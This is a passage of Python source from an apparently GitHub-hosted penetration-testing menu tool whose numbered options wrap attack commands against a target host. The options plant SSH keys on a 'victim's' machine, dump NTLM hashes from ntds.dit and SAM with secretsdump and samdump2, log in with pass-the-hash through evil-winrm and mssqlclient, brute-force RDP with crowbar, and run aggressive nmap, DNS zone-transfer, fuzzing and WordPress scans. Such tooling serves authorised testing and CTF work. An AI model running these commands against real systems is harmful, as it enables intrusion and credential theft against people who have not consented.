# Details : Menu option selected - SSH KEY GEN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      print(colored("[*] Generating Keys...", colour3))
      if os.path.exists("id_rsa.pub"):
         localCOM("rm id_rsa")
         localCOM("rm id_rsa.pub")
      localCOM("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      localCOM("chmod 600 id_rsa")
      catsFile("id_rsa.pub")
      print("[+] Now insert the above into authorized_Keys on the victim's machine...")            
      if USR[:2] == "''":
         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - klai cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      checkParam = test_PRT("80")
      if checkParam != 1:
         checkParam = test_WEB()
         if checkParam != 1:
            if WEB[:5] != "EMPTY":
               remoteCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
               print("[+] Username list generated via website...")
            else:
               checkParam = test_TIP()
               if checkParam != 1:
                  remoteCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
                  print("[+] Username list generated via ip address...")
      else:
         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
         cutLine("# minimal list of very", dataDir + "/usernames.txt")
         print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")

      for x in range (0, maxUser):
         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
         USER[x] = spacePadding(USER[x], COL3)         
      wipeTokens(VALD)         
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Kali cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':
      checkParam = test_PRT("80")
      if checkParam != 1:
         checkParam = test_WEB()
         if checkParam != 1:
            if WEB[:5] != "EMPTY":
               remoteCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + WEB.rstrip(" ") + " 2>&1")
               print("[+] Password list generated via website...")
            else:
               checkParam = test_TIP()
               if checkParam != 1:
                  remoteCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + TIP.rstrip(" ") + " 2>&1")
                  print("[+] Password list generated via ip address...")
      else:
         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
         cutLine("# minimal list of very", dataDir + "/passwords.txt")
         print("[+] Password list generated via /usr/share/ncrack/minimal.usr...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NTDS DECRYPT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))      
      if os.path.exists("./" + workDir + "/ntds.dit"):
         print("[+] File ntds.dit found...")
      else:
         print("[-] File ntds.dit not found, checking for SAM...")         
         if os.path.exists("./" + workDir + "/SAM"):
            print("[+] File SAM found...")
         else:
            print("[-] File SAM not found...")
            checkParam =1            
         if os.path.exists("./" + workDir + "/SYSTEM"):
            print("[+] File SYSTEM found...")
         else:
           print("[-] File SYSTEM not found...")
           checkParam = 1                  
         if os.path.exists("./" + workDir + "/SECURITY"):
            print("[+] File SECURITY found...")
         else:
            print("[-] File SECURITY not found")
      if checkParam != 1:
         print(colored("[*] Extracting stored secrets, please wait...", colour3))         
         if os.path.exists("./" + workDir + "/ntds.dit"):
            print("[+] Found ntds.dit...")
            remoteCOM(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
            localCOM("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
            localCOM("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")
         else:
            if os.path.exists("./" + workDir + "/SECURITY"):
               print("[+] Found SAM, SYSTEM and SECURITY...")
               localCOM(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
               localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
               localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
            else:
               print("[+] Found SAM and SYSTEM...")
               localCOM("samdump2 ./" + workDir + "/SYSTEM ./" + workDir + "/SAM > ./" + workDir + "/sam-extract.sam")
               localCOM("sed -i 's/\*disabled\* *//g' ./" + workDir + "/sam-extract.sam")
               localCOM("cut -f1 -d':' ./" + workDir + "*/sam-extract.sam > " + dataDir + "/usernames.txt")
               localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
         print("[+] Importing extracted secrets...")         
         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
           for x in range (0, maxUser):
               USER[x] = read1.readline().rstrip("\n")
               USER[x] = spacePadding(USER[x], COL3)                  
               HASH[x] = read2.readline().rstrip("\n")               
               if USER[x] != "":
                  HASH[x] = spacePadding(HASH[x], COL4)
               else:
                  HASH[x] = dotPadding(HASH[x], COL4)
               VALD[x] = "0"               
         wipeTokens(VALD)          
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='87':
      print("\nA NEW HYDRA INTERFACE IS BEING DEVELOPED.")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Redis Client
# Modified: N/A
# ------------------------------------------------------------------------------------- 

   if selection =='88':
      remoteCOM("redis-cli -h " + TIP.rstrip(" ") + " --pass " + PAS.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='89':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = test_PRT("873")         
      if checkParam != 1:
         checkParam = test_TSH()               
      if checkParam != 1:
         remoteCOM("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '90':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_PRT("873")         
      if checkParam != 1:
         remoteCOM("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")  
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - FTP uses port 21
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='91':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = test_PRT("21")                 
      if checkParam != 1:
         remoteCOM("ftp " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " 21")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh uses port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='92':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = test_PRT("22")                 
      if checkParam != 1:
         remoteCOM("sshpass -p '" + PAS.rstrip(" ") + "' ssh -o 'StrictHostKeyChecking no' " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh id_rsa use port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='93':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_PRT("22")          
      if checkParam != 1:
         remoteCOM("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Telnet randon port number
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='94':
      checkParam = test_TIP()                  
      if checkParam != 1:
         checkParam = getPort()
      if checkParam != 1:
         remoteCOM("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " " + checkParam)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NC random port number
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='95':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = getPort()               
      if checkParam != 1:
         remoteCOM("nc " + TIP.rstrip(" ") + " " + checkParam)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MSSQLCLIENT uses port 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='96':
      checkParam = test_DOM()            
      if checkParam != 1:
         checkParam = test_PRT("1433")               
      if checkParam != 1:
         if PAS[:1] != " ":
            remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
         else:
            if NTM[:1] != " ":
               print("[i] Using HASH value as password credential...")
               remoteCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MYSQL Login uses port 3306
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='97':
      checkParam = test_TIP()                  
      if checkParam != 1:
         checkParam = test_PRT("3306")            
      if checkParam != 1:
         remoteCOM("mysql -u " + USR.rstrip(" ") + " -p -h " + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WINRM remote login uses PORT 5985
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='98':
      if IP46 == "-4":
         checkParam = test_TIP()
      else:
         checkParam = test_DOM()                  
      if checkParam != 1:
         checkParam = test_PRT("5985")            
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using the HASH value as a password credential...")
            if IP46 == "-4":
               remoteCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
            else:
               remoteCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
         else:
            if IP46 == "-4":
               remoteCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
            else:
               remoteCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Xfreeredp port number 3389
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '99':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = test_PRT("3389")                     
      if checkParam != 1:
         remoteCOM("xfreerdp -sec-nla /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - crowbar RDP password bruteforce
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      checkParam = test_TIP()            
      if checkParam != 1:
         checkParam = test_PRT("3389")                     
      if checkParam != 1: 
         remoteCOM("crowbar -b rdp -s " + TIP.rstrip(" ") + "/32 -u " + USR.rstrip(" ") + " -C " + currentWordlist + " -n 1")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap options
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '231':
      PTS11 = getTCPorts()
      PTS22 = getUDPorts()     
      ALLPORTS = PTS11 + "," + PTS22
      ALLPORTS = sort(ALLPORTS)    
      PTS = ALLPORTS        
      POR = spacePadding(ALLPORTS, COL1)
      squidCheck()      
      SKEW = timeSync(SKEW)      
      prompt()     
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nmap TCP Scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '232':
      PTS1 = getTCPorts()
      PTS1 = PTS1 + ","
      PTS1 = sort(PTS1)
      POR = spacePadding(PTS1,COL1)
      prompt()      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nmap UDP Scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '233':
      PTS2 = getUDPorts()      
      PTS2 = PTS2 + ","
      PTS2 = sort(PTS2)
      POR = spacePadding(PTS2,COL1)
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------
# 
   if selection == '234':
      checkParam = test_TIP()      
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))
            print("[+] Performing a basic scan...")
            remoteCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " " + TIP.rstrip(" ") + " -oN basic.tmp 2>&1 > temp.tmp")
            nmapTrim("basic.tmp")
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1) 
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")
            parsFile("basic.tmp")
            catsFile("basic.tmp")            
         else:
            print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
            print("[+] Performing light scan...")
            remoteCOM("nmap " + IP46 + " -p- " + TIP.rstrip(" ") + " -oN basic.tmp 2>&1 > temp.tmp")
            nmapTrim("basic.tmp")
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...") 
            parsFile("basic.tmp")
            catsFile("basic.tmp")
         if "500," in PTS:
            remoteCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
            catsFile("ike.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------
# 
   if selection == '235':
      checkParam = test_TIP()      
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))          
            print("[+] Performing a light scan...")            
            remoteCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sCV --script=banner " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            nmapTrim("light.tmp")                      
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)   
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")
            parsFile("light.tmp")
            catsFile("light.tmp")            
         else:
            print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
            print("[+] Performing light scan...")
            remoteCOM("nmap " + IP46 + " -p- -SCV --script=banner " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
            nmapTrim("light.tmp")
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)  
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")           
            parsFile("light.tmp")
            catsFile("light.tmp")
         if "500," in PTS:
            remoteCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
            catsFile("ike.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '236':
      checkParam = test_TIP()      
      if checkParam != 1:
         if POR[:5] != "EMPTY":
            print(colored("[*] Scanning specified live ports only, please wait...", colour3))        
            print("[+] Performing heavy scan...")
            remoteCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sTUV -O -A -T4 --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
            nmapTrim("heavy.tmp")                      
            service = linecache.getline("service.tmp", 1)
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)  
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")                 
            parsFile("heavy.tmp")
            catsFile("heavy.tmp")                   
         else:
            print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
            print("[+] Performing heavy scan...")
            remoteCOM("nmap " + IP46 + " -p- -sTUV -O -A -T4 --script=discovery,external,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
            nmapTrim("heavy.tmp")
            if "WINDOWS" in service.upper():
               OSF = spacePadding("WINDOWS", COL1)
            if "LINUX" in service.upper():
               OSF = spacePadding("LINUX", COL1)
            if "OS X" in service.upper():
               OSF = spacePadding("OS X", COL1)
            if "ANDROID" in service.upper():
               OSF = spacePadding("ANDROID", COL1)
            if "IOS" in service.upper():
               OSF = spacePadding("IOS", COL1)
            print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")               
            parsFile("heavy.tmp")
            catsFile("heavy.tmp")
         if "500," in PTS:
            remoteCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
            catsFile("ike.tmp")
      prompt()
      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit usernames.txt.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '341':
      localCOM("nano " + dataDir + "/usernames.txt")               
      for x in range (0, maxUser):
         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
         USER[x] = spacePadding(USER[x], COL3)         
      wipeTokens(VALD)
      prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit passwords.txt.
# Modified: N/A
# -------------------------------------------------------------------------------------    
      
   if selection == '342':
      localCOM("nano " + dataDir + "/passwords.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit NTLM Hashes.
# Modified: N/A
# -------------------------------------------------------------------------------------        

   if selection == '343':      
      localCOM("nano " + dataDir + "/hashes.txt")                    
      for x in range (0, maxUser):
         HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
         HASH[x] = spacePadding(HASH[x], COL4)            
      wipeTokens(VALD)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit /etc/hosts.
# Modified: N/A
# -------------------------------------------------------------------------------------    
      
   if selection == '344':
      localCOM("nano /etc/hosts")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit /etc/resolv.conf.
# Modified: N/A
# -------------------------------------------------------------------------------------    

   if selection == '345':
      localCOM("nano /etc/resolv.conf")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit /etc/proxchains.conf.
# Modified: N/A
# -------------------------------------------------------------------------------------        

   if selection == '346':
      localCOM("nano /etc/proxychains.conf")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Edit /etc/krb5.conf.
# Modified: N/A
# -------------------------------------------------------------------------------------        

   if selection == '347':
      localCOM("nano /etc/krb5.conf")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - DNS ENUMERATION
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '441':
      checkParam = test_DNS()         
      if checkParam != 1:
         print(colored("[*] Checking DNS Server...\n", colour3))         
         remoteCOM("whois -I "  + DNS.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - DNS ENUMERATION
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection == '442':
      checkParam = test_DNS()
      if checkParam != 1:
         checkParam = test_DOM()
         if checkParam != 1:
            print(colored("[*] Checking DNS Server...", colour3))
            remoteCOM("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
#           remoteCOM("dig SOA " + DOM.rstrip(" ") + " @" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - DNS ENUMERATION
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection == '443':
      checkParam = test_DOM()      
      if checkParam != 1:
         print(colored("[*] Checking DOMAIN Server...", colour3))
         remoteCOM("dnsenum " + DOM.rstrip(" "))        
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - DNS ENUMERATION
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection == '444':      
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()         
         if checkParam != 1:
            print(colored("[*] Checking DOMAIN zone transfer...", colour3))
            remoteCOM("dnsrecon -d " + DOM.rstrip(" ") + " -t axfr")         
            print(colored("[*] Bruteforcing DOMAIN name, please wait this can take sometime...", colour3))
            remoteCOM("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '445':
      checkParam = test_DNS()
      if checkParam != 1:
         checkParam = test_DOM()         
      if checkParam != 1:
            print(colored("[*] Scanning for subdomains, please wait this can take sometime...", colour3))
            remoteCOM("gobuster dns -q --wordlist=" + currentWordlist + " --resolver " + DNS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -i")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '446':
      checkParam = test_WEB()
      if checkParam != 1:
         print(colored("[*] Scanning for vhosts, please wait this can take sometime...", colour3))
         remoteCOM("gobuster vhost -q -r -u " + WEB.rstrip(" ") + " -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' --wordlist=" + currentWordlist)
      prompt()
      
 # ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u WEB.rstrip("") -H "Host: FUZZ.DOM.rstrip(" ") --hl 154 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '447':
      checkParam = test_WEB()
      if checkParam != 1:
         print(colored("[*] Fuzzing for subdomains, please wait this can take sometime...", colour3))
         remoteCOM("wfuzz -c -f subdomains.tmp -w " + currentWordlist + " -u '" + WEB.rstrip(" ") + "' -H 'Host:FUZZ." + DOM.rstrip(" ")+"' " + FuzzRider.rstrip(" ") + " 2>&1 > dump.tmp")
         catsFile("subdomains.tmp")
      prompt()
           
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WPSCAN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '500':
      remoteCOM("wpscan --url " + WEB.rstrip(" ") + "  --enumerate u,vp,vt,dbe --plugins-detection aggressive")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WP PLUGIN SCAN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '501':
      remoteCOM("wpscan --url " + WEB.rstrip(" ") + "  --enumerate u,ap,vt,dbe,cb --plugins-detection mixed")
      prompt()     
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -NUCLEUI SCAN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '502':
      remoteCOM("nuclei --target " + WEB.rstrip("") + " --TAG wordpress")
      prompt()         
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - LFI CHECK
# Modified: N/A
